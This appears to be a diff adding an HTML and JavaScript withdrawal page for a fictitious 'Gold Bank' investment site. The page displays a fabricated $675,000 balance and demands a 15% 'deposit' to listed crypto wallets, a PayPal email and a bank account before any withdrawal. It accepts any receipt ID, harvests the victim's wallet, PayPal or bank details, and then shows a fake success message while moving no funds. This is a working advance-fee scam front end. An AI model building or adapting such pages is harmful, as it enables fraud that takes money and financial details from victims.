@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gold Bank - Withdrawal</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #f4f4f4 0%, #e0e0e0 100%);
+            min-height: 100vh;
+        }
+        .header {
+            background: linear-gradient(to right, #ffd700, #ffed4a);
+            padding: 20px 40px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+        }
+        .header-content {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .back-btn {
+            background: #2c3e50;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 14px;
+            width: auto;
+            transition: all 0.3s ease;
+        }
+        .back-btn:hover {
+            background: #34495e;
+            transform: translateX(-2px);
+        }
+        .header h1 {
+            margin: 0;
+            color: #2c3e50;
+            flex: 1;
+        }
+        .withdrawal-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .balance-info {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .split-container {
+            display: flex;
+            gap: 30px;
+        }
+        .left-panel, .right-panel {
+            flex: 1;
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .panel-title {
+            color: #2c3e50;
+            border-bottom: 2px solid #ffd700;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .payment-method {
+            background: #f8f9fa;
+            padding: 15px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border-left: 4px solid #ffd700;
+        }
+        .payment-method h3 {
+            margin: 0 0 10px 0;
+            color: #2c3e50;
+        }
+        .payment-method p {
+            margin: 5px 0;
+            color: #666;
+        }
+        input, select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        input:focus, select:focus {
+            outline: none;
+            border-color: #ffd700;
+            box-shadow: 0 0 5px rgba(255, 215, 0, 0.3);
+        }
+        button {
+            background: #ffd700;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            background: #e6c200;
+            transform: translateY(-2px);
+        }
+        .payment-fields {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+        .success-message {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+        .error-message {
+            background: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .split-container {
+                flex-direction: column;
+            }
+            .withdrawal-container {
+                padding: 10px;
+            }
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <button class="back-btn" onclick="window.location.href='assets.html'">← Back to Assets</button>
+            <h1>🏦 Gold Bank Withdrawal</h1>
+        </div>
+    </div>
+
+    <div class="withdrawal-container">
+        <div class="balance-info">
+            <h2>Current Balance: <span id="currentBalance">Loading...</span></h2>
+        </div>
+
+        <div class="split-container">
+            <!-- Left Panel: Payment Methods -->
+            <div class="left-panel">
+                <h2 class="panel-title">Payment Methods</h2>
+                <div class="payment-method">
+                    <h3>Cryptocurrency</h3>
+                    <p>Bitcoin: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
+                    <p>Ethereum: 0x71C7656EC7ab88b098defB751B7401B5f6d8976F</p>
+                    <p>USDT (TRC20): TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</p>
+                </div>
+                <div class="payment-method">
+                    <h3>PayPal</h3>
+                    <p>Email: payments@goldbank.com</p>
+                    <p>Business ID: GB123456789</p>
+                </div>
+                <div class="payment-method">
+                    <h3>Bank Transfer</h3>
+                    <p>Bank: Gold Bank International</p>
+                    <p>Account: 1234567890</p>
+                    <p>SWIFT: GOLDBANKXXX</p>
+                    <p>IBAN: GB29GOLD60161331926819</p>
+                </div>
+            </div>
+
+            <!-- Right Panel: Withdrawal Process -->
+            <div class="right-panel">
+                <h2 class="panel-title">Withdrawal Process</h2>
+                <form id="withdrawalForm" onsubmit="calculateDeposit(event)">
+                    <input type="number" id="withdrawalAmount" placeholder="Enter withdrawal amount" required min="0" step="0.01">
+                    <button type="submit">Calculate Required Deposit</button>
+                </form>
+
+                <div id="depositInfo" class="payment-fields" style="display: none;">
+                    <h3>Required Deposit</h3>
+                    <p>Amount: <span id="depositAmount">$0.00</span></p>
+                    <p>Please send the deposit using one of the payment methods shown on the left and send reciept id as proof of payment below.</p>
+                    <input type="text" id="transactionId" placeholder="Enter Transaction/RecieptID">
+                    <button onclick="confirmDeposit()">Confirm Deposit Payment</button>
+                </div>
+
+                <div id="receiverDetails" style="display: none;">
+                    <h3>Your Receiving Details</h3>
+                    <select id="paymentMethod" onchange="showPaymentFields()">
+                        <option value="">Select Receiving Method</option>
+                        <option value="crypto">Cryptocurrency</option>
+                        <option value="paypal">PayPal</option>
+                        <option value="bank">Bank Transfer</option>
+                    </select>
+
+                    <div id="cryptoFields" class="payment-fields" style="display: none;">
+                        <select id="cryptoType">
+                            <option value="btc">Bitcoin</option>
+                            <option value="eth">Ethereum</option>
+                            <option value="usdt">USDT</option>
+                        </select>
+                        <input type="text" placeholder="Your Wallet Address">
+                    </div>
+
+                    <div id="paypalFields" class="payment-fields" style="display: none;">
+                        <input type="email" placeholder="Your PayPal Email">
+                        <input type="email" placeholder="Confirm PayPal Email">
+                    </div>
+
+                    <div id="bankFields" class="payment-fields" style="display: none;">
+                        <input type="text" placeholder="Bank Name">
+                        <input type="text" placeholder="Account Number">
+                        <input type="text" placeholder="Account Holder Name">
+                        <input type="text" placeholder="SWIFT/BIC Code">
+                        <input type="text" placeholder="IBAN">
+                    </div>
+
+                    <button onclick="processWithdrawal()">Complete Withdrawal</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="successMessage" class="success-message"></div>
+        <div id="errorMessage" class="error-message"></div>
+    </div>
+
+    <script>
+        let withdrawalAmount = 0;
+        let depositAmount = 0;
+
+        window.onload = function() {
+            if (!sessionStorage.getItem('isLoggedIn')) {
+                window.location.href = 'login.html';
+                return;
+            }
+            const balance = parseFloat(sessionStorage.getItem('portfolioValue') || 675000);
+            document.getElementById('currentBalance').textContent = `$${balance.toLocaleString()}`;
+        }
+
+        function calculateDeposit(event) {
+            event.preventDefault();
+            const currentBalance = parseFloat(sessionStorage.getItem('portfolioValue') || 675000);
+            withdrawalAmount = parseFloat(document.getElementById('withdrawalAmount').value);
+            
+            if (withdrawalAmount <= 0) {
+                showError('Please enter a valid withdrawal amount');
+                return;
+            }
+            
+            if (withdrawalAmount > currentBalance) {
+                showError(`Insufficient funds. Your available balance is $${currentBalance.toLocaleString()}`);
+                return;
+            }
+            
+            depositAmount = withdrawalAmount * 0.15;
+            document.getElementById('depositAmount').textContent = `$${depositAmount.toLocaleString()}`;
+            document.getElementById('depositInfo').style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        function confirmDeposit() {
+            const transactionId = document.getElementById('transactionId').value;
+            if (!transactionId) {
+                showError('Please enter the transaction ID');
+                return;
+            }
+            document.getElementById('receiverDetails').style.display = 'block';
+            document.getElementById('depositInfo').style.display = 'none';
+        }
+
+        function showPaymentFields() {
+            const method = document.getElementById('paymentMethod').value;
+            document.querySelectorAll('.payment-fields').forEach(field => field.style.display = 'none');
+            if (method) {
+                document.getElementById(`${method}Fields`).style.display = 'block';
+            }
+        }
+
+        function processWithdrawal() {
+            const method = document.getElementById('paymentMethod').value;
+            if (!method) {
+                showError('Please select a receiving method');
+                return;
+            }
+
+            const fields = document.getElementById(`${method}Fields`).getElementsByTagName('input');
+            for (let field of fields) {
+                if (!field.value) {
+                    showError('Please fill in all receiving details');
+                    return;
+                }
+            }
+
+            let portfolioValue = parseFloat(sessionStorage.getItem('portfolioValue') || 675000);
+            portfolioValue -= withdrawalAmount;
+            sessionStorage.setItem('portfolioValue', portfolioValue);
+
+            const successMsg = document.getElementById('successMessage');
+            successMsg.innerHTML = `
+                <h3>Withdrawal Processed Successfully!</h3>
+                <p>Amount: $${withdrawalAmount.toLocaleString()}</p>
+                <p>New Balance: $${portfolioValue.toLocaleString()}</p>
+                <p>Redirecting to assets page...</p>
+            `;
+            successMsg.style.display = 'block';
+            document.getElementById('errorMessage').style.display = 'none';
+             
+            setTimeout(() => {
+                window.location.href = 'assets.html';
+            }, 3000);
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.style.display = 'block';
+            setTimeout(() => {
+                errorDiv.style.display = 'none';
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
+
+            
